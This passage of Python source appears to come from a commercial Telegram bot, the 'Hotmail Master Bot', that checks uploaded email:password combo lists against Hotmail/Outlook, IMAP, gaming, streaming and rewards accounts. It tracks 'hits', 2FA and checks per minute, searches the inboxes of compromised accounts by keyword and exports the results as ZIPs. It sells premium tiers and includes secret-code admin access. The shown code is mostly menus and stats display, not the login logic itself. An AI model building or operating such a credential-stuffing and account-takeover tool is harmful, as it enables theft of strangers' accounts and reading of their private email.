            daily_used = self.key_manager.get_daily_used(user_id)
            text += f"📅 Daily Usage: `{daily_used}/{limits['daily_limit']}` lines\n"
            text += f"⚡ Max Threads: `{limits['max_threads']}`\n"
            text += f"🔑 Max Services: `{limits['max_keywords']}`\n"
            text += f"📁 Multi‑scan: `{limits['multi_scan']}` files\n\n"
            text += "💎 Upgrade to Premium for higher limits!\nUse /buy or contact @NoMan8x8"
        else:
            text += "✅ Unlimited access enabled!"
        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

    async def cmd_keyword_inbox(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Keyword-based inbox scanner with ZIP export"""
        user_id = update.effective_user.id
        
        if not FullCustomInboxEngine:
            await update.message.reply_text("❌ Custom inbox engine not available")
            return
        
        keyboard = [
            [
                InlineKeyboardButton("📋 Upload Keywords", callback_data="ki_upload_keywords"),
                InlineKeyboardButton("� Manual Keywords", callback_data="ki_manual_keywords")
            ],
            [
                InlineKeyboardButton("📁 Upload Combos", callback_data="ki_upload_combos"),
                InlineKeyboardButton("📝 Manual Combos", callback_data="ki_manual_combos")
            ],
            [InlineKeyboardButton("❌ Cancel", callback_data="ki_cancel")]
        ]
        
        await update.message.reply_text(
            "🎯 *Keyword Inbox Scanner*\n\n"
            "✅ Full Hotmail/Outlook checker with:\n"
            "  • Keyword search in inbox\n"
            "  • Country detection\n"
            "  • 2FA detection\n"
            "  • Results organized by keyword\n"
            "  • ZIP export included\n\n"
            "Choose input method for keywords & combos:\n"
            "📋 Upload or 📝 Type manually",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def cmd_live(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        await self._show_live_stats(update.message.chat_id, user_id, context)

    async def cmd_stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in self.active_scans:
            await update.message.reply_text("⚠️ No active scan to stop.")
            return
        scan_info = self.active_scans[user_id]
        scan_info['stop_event'].set()
        if 'stats' in scan_info and scan_info['stats']:
            scan_info['stats'].stop()
        await update.message.reply_text("🛑 Stopping scan... Results will be sent shortly.")

    async def cmd_broadcast_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        BROADCAST_ADMIN = 8134424193
        if user_id != BROADCAST_ADMIN:
            await update.message.reply_text("⛔ Only admin 8134424193 can broadcast!")
            return
        if not context.args:
            await update.message.reply_text("Usage: /broadcast <message>")
            return
        message = ' '.join(context.args)
        await self._broadcast_message(context, message, update.effective_chat.id)

    async def cmd_admin_auth(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not context.args:
            await update.message.reply_text("⚠️ **Admin Authentication**\n\nUsage: `/adminauth <secret_code>`\n\nThis command is for admin access only.", parse_mode=ParseMode.MARKDOWN)
            return
        provided_code = context.args[0].strip()
        if provided_code == SECRET_ADMIN_CODE:
            if user_id not in self.admin_ids:
                self.admin_ids.append(user_id)
                self.key_manager.add_premium_manual(user_id, 36500)
                await update.message.reply_text("🎉 **Admin Access Granted!** ✅\n\nYou now have:\n• 👑 Admin panel access\n• ⭐ Premium status (Lifetime)\n• 🔑 Full bot control\n\nUse /start to access the admin panel.", parse_mode=ParseMode.MARKDOWN)
            else:
                await update.message.reply_text("✅ **Already Admin**\n\nYou already have admin access!\nUse /start to access the admin panel.", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ **Invalid Code**\n\nThe secret code you provided is incorrect.\nContact @NoMan8x8 if you need assistance.", parse_mode=ParseMode.MARKDOWN)

    async def cmd_admin_delete(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.effective_user or update.effective_user.id not in self.admin_ids:
            await update.message.reply_text("⛔ Unauthorized!")
            return
        user_id = update.effective_user.id
        if not context.args or len(context.args) < 2:
            await update.message.reply_text("Usage: `/admindelete <code> <target>`\nTargets: all_users, all_keys, all_data")
            return
        code = context.args[0].strip()
        if code != SECRET_DELETE_CODE:
            await update.message.reply_text("❌ Invalid code.")
            return
        target = context.args[1].lower()
        if target == "all_users":
            admin_str = str(user_id)
            count = 0
            for uid in list(self.key_manager.get_all_users().keys()):
                if uid != admin_str:
                    del self.key_manager.users[uid]
                    count += 1
            self.key_manager._save_users()
            await update.message.reply_text(f"🗑️ Deleted {count} users (kept your admin).")
        elif target == "all_keys":
            count = self.key_manager.delete_all_keys()
            await update.message.reply_text(f"🗑️ Deleted {count} keys.")
        elif target == "all_data":
            admin_str = str(user_id)
            self.key_manager.users = {admin_str: self.key_manager.users.get(admin_str, {})}
            self.key_manager._save_users()
            self.key_manager.keys_data["keys"] = {}
            self.key_manager.keys_data["stats"] = {"total_keys": 0, "redeemed": 0, "total_checked": 0, "total_hits": 0}
            self.key_manager._save_keys()
            await update.message.reply_text("🗑️ Deleted all data except your admin.")
        else:
            await update.message.reply_text("Invalid target.")

    async def cmd_sync_channel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.effective_user or update.effective_user.id not in self.admin_ids:
            await update.message.reply_text("⛔ Unauthorized!")
            return
        if not self.channels:
            await update.message.reply_text("❌ No channels configured.")
            return
        channel_username = self.channels[0][1]
        channel_id = str(channel_username).lstrip('@')
        await update.message.reply_text(f"🔄 Syncing members from {channel_username}... This may take a while.")
        try:
            count = 0
            async for member in context.bot.get_chat_members(chat_id=channel_id):
                u = member.user
                self.key_manager.register_user_if_new(
                    u.id, username=u.username or "",
                    first_name=u.first_name or "",
                    last_name=u.last_name or ""
                )
                count += 1
                if count % 50 == 0:
                    await update.message.reply_text(f"✅ Synced {count} members so far...")
            await update.message.reply_text(f"✅ Successfully synced {count} members from channel {channel_username}.")
        except Exception as e:
            logger.error(f"Channel sync error: {e}")
            await update.message.reply_text(f"❌ Error: {e}\nMake sure the bot is an admin in the channel and the channel is public or the bot can access members.")

    async def cmd_ban(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        BAN_ADMIN = 8134424193
        if user_id != BAN_ADMIN:
            await update.message.reply_text("⛔ Only admin 8134424193 can ban users!")
            return
        if not context.args:
            await update.message.reply_text("Usage: /ban <user_id> [reason]")
            return
        target_id = int(context.args[0])
        reason = " ".join(context.args[1:]) if len(context.args) > 1 else "No reason provided"
        if self.key_manager.ban_user(target_id):
            await update.message.reply_text(f"✅ User {target_id} has been banned.\nReason: {reason}")
            try:
                await context.bot.send_message(chat_id=target_id, text=f"🚫 You have been banned from using this bot.\nReason: {reason}\nContact @NoMan8x8 if you think this is a mistake.")
            except:
                pass
        else:
            await update.message.reply_text(f"❌ User {target_id} not found or already banned.")

    async def cmd_unban(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        BAN_ADMIN = 8134424193
        if user_id != BAN_ADMIN:
            await update.message.reply_text("⛔ Only admin 8134424193 can unban users!")
            return
        if not context.args:
            await update.message.reply_text("Usage: /unban <user_id>")
            return
        target_id = int(context.args[0])
        if self.key_manager.unban_user(target_id):
            await update.message.reply_text(f"✅ User {target_id} has been unbanned.")
            try:
                await context.bot.send_message(chat_id=target_id, text="✅ You have been unbanned. You can now use the bot again.")
            except:
                pass
        else:
            await update.message.reply_text(f"❌ User {target_id} not found or not banned.")

    # ==================== LIVE STATS DISPLAY ====================
    async def _show_live_stats(self, chat_id: int, user_id: int, context: ContextTypes.DEFAULT_TYPE):
        # Check both regular and premium scans
        scan_info = self.active_scans.get(user_id, {}) or self.active_premium_scans.get(user_id, {})
        stats_instance = scan_info.get('stats')
        if not stats_instance:
            await context.bot.send_message(chat_id=chat_id, text="📊 No active scan running.\n\nStart a scan first from the Cracker menu.", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_live_stats_keyboard(user_id))
            return
        snapshot = stats_instance.get_snapshot()
        progress = snapshot['progress']
        progress_bar = snapshot['progress_bar']
        update_time = datetime.now().strftime("%H:%M:%S")
        text = f"🔥 **LIVE SCAN STATS** (Auto-refresh | {update_time})\n\n```\n📊 Total:    {snapshot['total']:,}\n✅ Checked:  {snapshot['checked']:,}\n❌ Bad:      {snapshot['bad']:,}\n🎯 Hits:     {snapshot['hits']:,}\n📱 2FA:      {snapshot['two_fa']:,}\n⚠️ Errors:   {snapshot['errors']:,}\n```\n\n**Progress:** `{progress:.1f}%`\n`{progress_bar}`\n\n⚡ **CPM:** `{snapshot['cpm']}`\n⏱️ **Elapsed:** `{snapshot['elapsed']}`\n⏳ **ETA:** `{snapshot['eta']}`\n\n🎮 **Gaming Hits:**\n  • MC Hits: {snapshot['mc_hits']}\n  • PSN Hits: {snapshot['psn_hits']}\n  • Crunchyroll Hits: {snapshot['crunchyroll_hits']}\n💎 **Rewards Hits:** {snapshot['reward_hits']}\n📧 **IMAP Hits:** {snapshot['imap_hits']}\n🔥 **Bruter Hits:** {snapshot['bruter_hits']}"
        with self.status_lock:
            msg_id = self.status_messages.get(user_id)
        keyboard = self.get_live_stats_keyboard(user_id)
        try:
            if msg_id:
                await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)
            else:
                msg = await context.bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)
                with self.status_lock:
                    self.status_messages[user_id] = msg.message_id
                asyncio.create_task(self._auto_refresh_live_stats(chat_id, user_id, context, msg.message_id))
        except Exception as e:
            logger.debug(f"Error showing stats: {e}")

    async def _auto_refresh_live_stats(self, chat_id: int, user_id: int, context: ContextTypes.DEFAULT_TYPE, message_id: int):
        while True:
            # Check both regular and premium scans
            scan_info = self.active_scans.get(user_id) or self.active_premium_scans.get(user_id)
            if not scan_info:
                break
            stats_instance = scan_info.get('stats')
            if not stats_instance or not stats_instance._is_running:
                break
            snapshot = stats_instance.get_snapshot()
            progress = snapshot['progress']
            progress_bar = snapshot['progress_bar']
            update_time = datetime.now().strftime("%H:%M:%S")
            text = f"🔥 **LIVE SCAN STATS** (Auto-refresh | {update_time})\n\n```\n📊 Total:    {snapshot['total']:,}\n✅ Checked:  {snapshot['checked']:,}\n❌ Bad:      {snapshot['bad']:,}\n🎯 Hits:     {snapshot['hits']:,}\n📱 2FA:      {snapshot['two_fa']:,}\n⚠️ Errors:   {snapshot['errors']:,}\n```\n\n**Progress:** `{progress:.1f}%`\n`{progress_bar}`\n\n⚡ **CPM:** `{snapshot['cpm']}`\n⏱️ **Elapsed:** `{snapshot['elapsed']}`\n⏳ **ETA:** `{snapshot['eta']}`\n\n🎮 **Gaming Hits:**\n  • MC Hits: {snapshot['mc_hits']}\n  • PSN Hits: {snapshot['psn_hits']}\n  • Crunchyroll Hits: {snapshot['crunchyroll_hits']}\n💎 **Rewards Hits:** {snapshot['reward_hits']}\n📧 **IMAP Hits:** {snapshot['imap_hits']}\n🔥 **Bruter Hits:** {snapshot['bruter_hits']}"
            try:
                await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_live_stats_keyboard(user_id))
            except Exception as e:
                logger.debug(f"Auto-refresh edit failed: {e}")
                break
            await asyncio.sleep(2)

    def _create_live_progress_callback(self, chat_id: int, user_id: int, context: ContextTypes.DEFAULT_TYPE, stats_instance):
        def progress_callback(snapshot: Dict[str, Any]):
            try:
                if not hasattr(self, 'app') or not self.app:
                    return
                loop = self.app._event_loop if hasattr(self.app, '_event_loop') else None
                if not loop:
                    try:
                        loop = asyncio.get_running_loop()
                    except RuntimeError:
                        loop = asyncio.new_event_loop()
                if not loop or loop.is_closed():
                    return
                future = asyncio.run_coroutine_threadsafe(self._update_live_stats_message(chat_id, user_id, snapshot, context), loop)
                future.add_done_callback(lambda f: f.result() if not f.exception() else None)
            except Exception as e:
                logger.error(f"Callback exception: {e}")
        return progress_callback

    async def _update_live_stats_message(self, chat_id: int, user_id: int, snapshot: Dict[str, Any], context: ContextTypes.DEFAULT_TYPE):
        current_time = time.time()
        if not hasattr(self, '_last_update_time'):
            self._last_update_time = {}
        key = f"{user_id}_{chat_id}"
        if current_time - self._last_update_time.get(key, 0) < 0.5:
            return
        self._last_update_time[key] = current_time
        # Check both regular and premium scans
        scan_info = self.active_scans.get(user_id, {}) or self.active_premium_scans.get(user_id, {})
        stats_instance = scan_info.get('stats')
        if not stats_instance:
            return
        fresh = stats_instance.get_snapshot()
        progress = fresh['progress']
        progress_bar = fresh['progress_bar']
        update_time = datetime.now().strftime("%H:%M:%S")
        text = f"🔥 **LIVE SCAN STATS** (Auto-refresh | {update_time})\n\n```\n📊 Total:    {fresh['total']:,}\n✅ Checked:  {fresh['checked']:,}\n❌ Bad:      {fresh['bad']:,}\n🎯 Hits:     {fresh['hits']:,}\n📱 2FA:      {fresh['two_fa']:,}\n⚠️ Errors:   {fresh['errors']:,}\n```\n\n**Progress:** `{progress:.1f}%`\n`{progress_bar}`\n\n⚡ **CPM:** `{fresh['cpm']}`\n⏱️ **Elapsed:** `{fresh['elapsed']}`\n⏳ **ETA:** `{fresh['eta']}`\n\n🎮 **Gaming Hits:**\n  • MC Hits: {fresh['mc_hits']}\n  • PSN Hits: {fresh['psn_hits']}\n  • Crunchyroll Hits: {fresh['crunchyroll_hits']}\n💎 **Rewards Hits:** {fresh['reward_hits']}\n📧 **IMAP Hits:** {fresh['imap_hits']}\n🔥 **Bruter Hits:** {fresh['bruter_hits']}"
        with self.status_lock:
            msg_id = self.status_messages.get(user_id)
        if not msg_id:
            return
        try:
            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_live_stats_keyboard(user_id))
        except Exception as e:
            logger.debug(f"Failed to update message: {e}")

    # ==================== CALLBACK HANDLER ====================
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        # Safety check: ensure callback query and user exist
        query = update.callback_query
        if not query or not query.from_user:
            logger.warning("Callback query missing user info - ignoring")
            return
        
        user_id = query.from_user.id
        data = query.data
        if not data:
            return
        
        # ==================== HIGH-PRESSURE DEDUPLICATION ====================
        # Prevent double-clicks within 0.5 seconds on same button
        callback_key = f"{user_id}:{data}"
        current_time = time.time()
        
        if callback_key in self._pending_callbacks:
            last_click_time = self._pending_callbacks[callback_key]
            if current_time - last_click_time < 0.5:
                # Ignore rapid duplicate clicks
                try:
                    await query.answer("⏳ Processing...", show_alert=False)
                except:
                    pass
                return
        
        # Update last click time
        self._pending_callbacks[callback_key] = current_time
        
        # Clean old entries periodically (keep < 100ms old)
        if len(self._pending_callbacks) > 1000:
            cutoff_time = current_time - 1.0
            self._pending_callbacks = {k: v for k, v in self._pending_callbacks.items() if v > cutoff_time}
        
        try:
            await query.answer()
        except:
            pass

        if self.key_manager.is_banned(user_id) and data not in ["check_joined", "menu_main", "menu_exit"]:
            await query.edit_message_text("🚫 You are banned from using this bot. Contact @NoMan8x8.")
            return

        if data == "check_joined":
            # User clicked "I Joined All Channels" - grant access
            user_id = query.from_user.id
            user_data = self.key_manager.users.setdefault(str(user_id), {})
            user_data["last_channel_verify_time"] = datetime.now().isoformat()
            self.key_manager.users[str(user_id)] = user_data
            # Note: KeyManager doesn't have save_users() - data is kept in memory
            
            try:
                await query.edit_message_text("✅ Access granted! Loading menu...")
            except Exception as e:
                if "not modified" not in str(e).lower():
                    logger.warning(f"Error editing message: {e}")
            
            await self._send_welcome_message(query.message.chat_id, query.from_user, context)
            return
        if data == "menu_main":
            await query.message.delete()
            await self._send_welcome_message(query.message.chat_id, query.from_user, context)
            return
        if data == "menu_cracker":
            await self._show_cracker_menu(query)
            return
        if data == "menu_keywords":
            self.user_sessions.setdefault(user_id, {})["state"] = "selecting_keywords"
            await query.edit_message_text(
                f"🔑 **Select Services ({TOTAL_KEYWORDS}+ available)**\n\nChoose services to check (max depends on your plan):\n\n✅ = selected | ⬜ = not selected\n\n📁 Results will be saved as ZIP with files named by service domain\n\n**Service Categories:**\n• Social Media (40+)\n• Gaming (60+)\n• Streaming (35+)\n• Shopping (40+)\n• Finance & Crypto (30+)\n• AI Platforms (25+)\n• Education (20+)",
                parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_keyboard_page(user_id, 0)
            )
            return
        if data == "menu_profile":
            await self._show_profile(query, user_id)
            return
        if data == "menu_invite_rewards":
            await self._show_invite_rewards(query, user_id, context)
            return
        if data == "menu_status":
            await self._show_bot_status(query)
            return
        if data == "menu_current_scans":
            await self._show_current_scans(query, context)
            return
        if data == "menu_premium_scans":
            await self._show_premium_scans(query, context)
            return
        if data == "menu_leaderboards":
            await self._show_leaderboards(query)
            return
        if data == "menu_exit":
            await query.edit_message_text("👋 **Goodbye!**\n\nThanks for using Hotmail Master Bot.\nUse /start to return anytime.\n\n👨‍💻 Dev: @NoMan8x8", parse_mode=ParseMode.MARKDOWN)
            return
        if data == "live_refresh":
            chat_id = query.message.chat_id
            user_id = query.from_user.id
            # Check both regular and premium scans
            scan_info = self.active_scans.get(user_id, {}) or self.active_premium_scans.get(user_id, {})
            stats_instance = scan_info.get('stats')
            if stats_instance:
                snapshot = stats_instance.get_snapshot()
                update_time = datetime.now().strftime("%H:%M:%S")
                progress = snapshot['progress']
                progress_bar = snapshot['progress_bar']
                text = f"🔥 **LIVE SCAN STATS** (Manual refresh | {update_time})\n\n```\n📊 Total:    {snapshot['total']:,}\n✅ Checked:  {snapshot['checked']:,}\n❌ Bad:      {snapshot['bad']:,}\n🎯 Hits:     {snapshot['hits']:,}\n📱 2FA:      {snapshot['two_fa']:,}\n⚠️ Errors:   {snapshot['errors']:,}\n```\n\n**Progress:** `{progress:.1f}%`\n`{progress_bar}`\n\n⚡ **CPM:** `{snapshot['cpm']}`\n⏱️ **Elapsed:** `{snapshot['elapsed']}`\n⏳ **ETA:** `{snapshot['eta']}`\n\n🎮 **Gaming Hits:**\n  • MC Hits: {snapshot['mc_hits']}\n  • PSN Hits: {snapshot['psn_hits']}\n  • Crunchyroll Hits: {snapshot['crunchyroll_hits']}\n💎 **Rewards Hits:** {snapshot['reward_hits']}\n📧 **IMAP Hits:** {snapshot['imap_hits']}\n🔥 **Bruter Hits:** {snapshot['bruter_hits']}"
                try:
                    await query.edit_message_text(text=text, parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_live_stats_keyboard(user_id))
                except Exception as e:
                    await query.message.delete()
                    await self._show_live_stats(chat_id, user_id, context)
            else:
                await query.message.delete()
                await self._show_live_stats(query.message.chat_id, user_id, context)
            return
        if data.startswith("fullscan_refresh_"):
            # Handle full scan refresh with improved display
            user_id = query.from_user.id
            chat_id = query.message.chat_id
            scan_info = self.active_scans.get(user_id, {})
            if scan_info and 'stats' in scan_info:
                full_scan_stats = scan_info['stats']
                
                # Calculate totals and speeds
                total_checked = sum(full_scan_stats[c]['checked'] for c in ['brute', 'mc', 'psn', 'rewards', 'imap', 'hotmail'])
                total_hits = sum(full_scan_stats[c]['hits'] for c in ['brute', 'mc', 'psn', 'rewards', 'imap', 'hotmail'])
                elapsed_seconds = time.time() - full_scan_stats['start_time']
                
                # Calculate speeds
                cps = total_checked / elapsed_seconds if elapsed_seconds > 0 else 0
                cpm = int(cps * 60)
                cph = int(cps * 3600)
                remaining_combos = full_scan_stats['total_combos'] - total_checked
                eta_seconds = remaining_combos / cps if cps > 0 else 0
                
                # Hit rate percentage
                hit_rate = (total_hits / total_checked * 100) if total_checked > 0 else 0
                
                # Speed gauge emoji representation
                if cpm >= 1000:
                    speed_gauge = "🔥🔥🔥🔥🔥"
                elif cpm >= 500:
                    speed_gauge = "🔥🔥🔥🔥"
                elif cpm >= 200:
                    speed_gauge = "🔥🔥🔥"
                elif cpm >= 100:
                    speed_gauge = "🔥🔥"
                elif cpm > 0:
                    speed_gauge = "🔥"
                else:
                    speed_gauge = "❄️"
                
                # Format elapsed time
                mins, secs = divmod(int(elapsed_seconds), 60)
                hours, mins = divmod(mins, 60)
                if hours > 0:
                    elapsed_str = f"{hours}h {mins}m {secs}s"
                else:
                    elapsed_str = f"{mins}m {secs}s"
                
                # Format ETA
                eta_mins, eta_secs = divmod(int(eta_seconds), 60)
                eta_hours, eta_mins = divmod(eta_mins, 60)
                if eta_hours > 0:
                    eta_str = f"{eta_hours}h {eta_mins}m"
                else:
                    eta_str = f"{eta_mins}m {eta_secs}s"
                
                # Progress bar
                progress = (total_checked / full_scan_stats['total_combos'] * 100) if full_scan_stats['total_combos'] > 0 else 0
                bar_filled = int(progress / 10)
                progress_bar = "█" * bar_filled + "░" * (10 - bar_filled)
                
                # Show active crackers
                active = full_scan_stats['active_crackers']
                active_str = " + ".join([c.upper() for c in sorted(active)]) if active else "⏸️ Finalizing..."
                
                # Build impressive display with CPM as main focus
                text = f"╔═══════════════════════════════════════╗\n"
                text += f"║  🚀 **FULL SCAN PRO** - PARALLEL MODE  ║\n"
                text += f"╚═══════════════════════════════════════╝\n\n"
                
                # CPM MAIN DISPLAY - HUGE AND BOLD
                text += f"⚡ **CPM: {cpm:,} CHECKS/MIN** {speed_gauge}\n"
                text += f"   └─ {cps:.1f} checks/sec | {cph:,} checks/hour\n\n"
                
                # Scan progress
                text += f"📊 **SCAN PROGRESS**\n"
                text += f"├─ Total: {full_scan_stats['total_combos']:,} combos\n"
                text += f"├─ Checked: {total_checked:,} ({progress:.1f}%)\n"
                text += f"├─ Hits: {total_hits} 🎯 | Hit Rate: {hit_rate:.2f}%\n"
                text += f"└─ [{progress_bar}]\n\n"
                
                # Time info
                text += f"⏱️ **TIME INFO**\n"
                text += f"├─ Elapsed: {elapsed_str}\n"
                text += f"├─ Remaining: {remaining_combos:,} combos\n"
                text += f"└─ ETA: {eta_str}\n\n"
                
                # Active crackers with emphasis
                text += f"🔄 **ACTIVE NOW**: {active_str}\n"
                text += f"   Threads: {len(active)} running in parallel\n\n"
                
                # Per-cracker performance
                text += f"{'╔' + '═'*37 + '╗'}\n"
                text += f"║ **CRACKER PERFORMANCE**               ║\n"
                text += f"{'╠' + '═'*37 + '╣'}\n"
                
                for cracker_name in ['brute', 'mc', 'psn', 'rewards', 'imap', 'hotmail']:
                    stats = full_scan_stats[cracker_name]
                    checked = stats['checked']
                    hits = stats['hits']
                    
                    # Individual CPM
                    if elapsed_seconds > 0 and checked > 0:
                        ind_cps = checked / elapsed_seconds
                        ind_cpm = int(ind_cps * 60)
                    else:
                        ind_cpm = 0
                    
                    # Status indicator
                    if cracker_name in active:
                        status = "▶️"
                    elif hits > 0:
                        status = "✅"
                    elif checked > 0:
                        status = "⏹️"
                    else:
                        status = "⏸️"
                    
                    hit_str = f"({hits}🎯)" if hits > 0 else "(0)"
                    text += f"║{status} {cracker_name.upper():8} │ {ind_cpm:>5,}cpm │ {hit_str:<4} {checked:>5}c║\n"
                
                text += f"{'╚' + '═'*37 + '╝'}\n"
                
                keyboard = [[InlineKeyboardButton("🔄 REFRESH", callback_data=f"fullscan_refresh_{user_id}")]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                try:
                    await query.edit_message_text(text=text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
                except Exception as e:
                    logger.debug(f"Fullscan refresh failed: {e}")
                    await query.answer("📊 Stats refreshed!", show_alert=False)
            else:
                await query.answer("❌ No active full scan!", show_alert=True)
            return
        if data == "live_stop":
            if user_id in self.active_scans:
                scan_info = self.active_scans[user_id]
                scan_info['stop_event'].set()
                if 'stats' in scan_info and scan_info['stats']:
                    scan_info['stats'].stop()
                await query.answer("🛑 Stopping scan...", show_alert=True)
            return
        if data.startswith("buy_"):
            await self._handle_buy_selection(query, data, user_id)
            return
        if data == "cmd_buy":
            await self._show_buy_menu(query)
            return
        if data == "menu_admin":
            if user_id not in self.admin_ids:
                await query.answer("⛔ Unauthorized!", show_alert=True)
                return
            await self._show_admin_panel(query)
            return
        if user_id in self.admin_ids and data.startswith("admin_"):
            await self._handle_admin_action(query, data, user_id, context)
            return

        # ==================== GIVEAWAY HANDLERS ====================
        if data == "giveaway_participate":
            participants = self.giveaway_manager.get_participants()
            is_participant = any(p["user_id"] == user_id for p in participants)
            
            if not self.giveaway_manager.is_active():
                await query.answer("❌ No active giveaway at the moment!", show_alert=True)
                return
            
            if is_participant:
                await query.answer("⚠️ You already participate in this giveaway!", show_alert=True)
                return
            
            # Add participant
            if self.giveaway_manager.add_participant(user_id, query.from_user.first_name, query.from_user.username):
                count = self.giveaway_manager.get_participant_count()
                await query.answer(f"✅ Welcome to the giveaway! Total participants: {count}", show_alert=True)
                
                # Show updated giveaway with new participant count
                keys_count = len(self.giveaway_manager.get_keys())
                await query.edit_message_text(
                    f"🎉 **Thanks for Participating!**\n\n"
                    f"You are now registered for the giveaway.\n\n"
                    f"👥 **Participants so far:** {count}\n"
                    f"🎁 **Keys to win:** {keys_count}\n\n"
                    f"🏆 Winners will be announced soon!\n"
                    f"🎁 Keys will be sent to your DM.\n\n"
                    f"Good luck! 🍀",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="giveaway_back")]])
                )
            else:
                await query.answer("❌ Error joining giveaway. Try again.", show_alert=True)
            return
        
        if data == "giveaway_back":
            # Show giveaway status
            if self.giveaway_manager.is_active():
                count = self.giveaway_manager.get_participant_count()
                keys_count = len(self.giveaway_manager.get_keys())
                await query.edit_message_text(
                    f"🎉 **🔥 HOTMAIL KEYS GIVEAWAY 🔥** 🎉\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✨ **EXCLUSIVE PREMIUM KEYS GIVEAWAY** ✨\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🎁 **What's on offer?**\n"
                    f"• **{keys_count} PREMIUM KEYS**\n"
                    f"• Randomly selected winners\n"
                    f"• Keys delivered instantly to your DM\n\n"
                    f"📊 **Participants so far:** `{count}`\n"
                    f"🎁 **Keys to win:** `{keys_count}`\n\n"
                    f"🍀 **Good luck!** 🍀",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🎁 PARTICIPATE 🎁", callback_data="giveaway_participate")]])
                )
            else:
                await query.answer("❌ No active giveaway. Check back later!", show_alert=True)
            return

        # ==================== SERVICE SELECTION ====================
        if data == "kw_noop":
            return
        if data == "kw_select_all":
            session = self.user_sessions.setdefault(user_id, {})
            session["selected_keywords"] = DISPLAY_NAMES.copy()
            await query.edit_message_text(f"🔑 **Select Services**\n\n✅ All {TOTAL_KEYWORDS} services selected!\n\n📁 Results ZIP format:\n`service_domain_at_provider_com.txt`\nExample: `playstation_com.txt`", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_keyboard_page(user_id, 0))
            return
        if data == "kw_deselect_all":
            session = self.user_sessions.setdefault(user_id, {})
            session["selected_keywords"] = []
            await query.edit_message_text("🔑 **Select Services**\n\n❌ All services deselected!\n\nChoose services to check (max depends on your plan):", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_keyboard_page(user_id, 0))
            return
        if data.startswith("kw_page_"):
            page = int(data.split("_")[2])
            await query.edit_message_text("🔑 **Select Services**\n\nChoose services to check (max depends on your plan):\n\n📁 ZIP format: `service_domain_at_provider_com.txt`", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_keyboard_page(user_id, page))
            return
        if data.startswith("kw_toggle_"):
            parts = data.split("_")
            page = int(parts[2])
            display_name = "_".join(parts[3:])
            session = self.user_sessions.setdefault(user_id, {})
            selected = session.get("selected_keywords", [])
            if display_name in selected:
                selected.remove(display_name)
            else:
                tier = self._get_user_tier(user_id)
                max_kw = PREMIUM_TIERS[tier]["max_keywords"]
                if len(selected) < max_kw:
                    selected.append(display_name)
                else:
                    await query.answer(f"❌ Your plan allows only {max_kw} services!", show_alert=True)
                    return
            session["selected_keywords"] = selected
            await query.edit_message_text("🔑 **Select Services**\n\nChoose services to check (max depends on your plan):", parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_keyboard_page(user_id, page))
            return
        if data == "kw_confirm":
            try:
                selected = self.user_sessions.get(user_id, {}).get("selected_keywords", [])
                if not selected:
                    await query.answer("❌ Please select at least one service!", show_alert=True)
                    return
                tier = self._get_user_tier(user_id)
                max_keywords = PREMIUM_TIERS[tier]["max_keywords"]
                if len(selected) > max_keywords:
                    await query.answer(f"❌ Your plan allows only {max_keywords} services!", show_alert=True)
                    return
                # Store the actual service names for scanning
                self.user_sessions[user_id]["selected_actual_keywords"] = selected
                selected_names = "\n".join([f"• {name}" for name in selected[:15]])
                if len(selected) > 15:
                    selected_names += f"\n... and {len(selected) - 15} more"
                zip_preview = ""
                for name in selected[:5]:
                    try:
                        filename = keyword_to_filename(name)
                        clean_name = filename.replace(".txt", "")
                        zip_preview += f"  📄 {clean_name}\n"
                    except Exception as e:
                        zip_preview += f"  📄 {name}\n"
                if len(selected) > 5:
                    zip_preview += f"  📄 ... and {len(selected) - 5} more"
                message = f"✅ {len(selected)} services saved!\n\nSelected services:\n{selected_names}\n\n📁 ZIP Results Preview:\n{zip_preview}\n\nNow go to: Cracker → My Selected Services to start!\n\nNote: Your plan allows up to {max_keywords} services."
                await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔥 Go to Cracker", callback_data="menu_cracker"), InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]))
            except Exception as e:
                logger.error(f"Error in kw_confirm handler: {e}")
                try:
                    await query.edit_message_text("❌ Error processing services. Please try again.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="menu_keywords")]]))
                except:
                    pass
            return

